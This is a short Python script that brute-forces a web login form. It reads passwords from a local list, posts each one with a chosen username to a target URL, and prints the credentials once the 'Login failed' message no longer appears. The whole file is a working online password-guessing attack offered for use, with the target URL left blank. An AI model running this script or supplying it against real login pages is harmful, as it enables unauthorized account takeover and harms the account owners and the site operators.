#!/usr/bin/env python3

import requests


def bruteforce(username, url):
    for password in passwords:
        password = password.strip()
        print(f"[!!] Trying To Bruteforce With Password: {password}")
        data_dictionary = {
            "username": username,
            "password": password,
            "Login": "submit"
        }
        response = requests.post(url, data=data_dictionary)
        if "Login failed" in response.content:
            pass
        else:
            print(f"[+] Username: --> {username}")
            print(f"[+] Password: --> {password}")
            exit()

url = ""

username = input("* Enter Username For Specified Page: ")

with open("passlist.txt", "r") as passwords:
    bruteforce(username, url)


print("[!!] Password Is Not In This List!")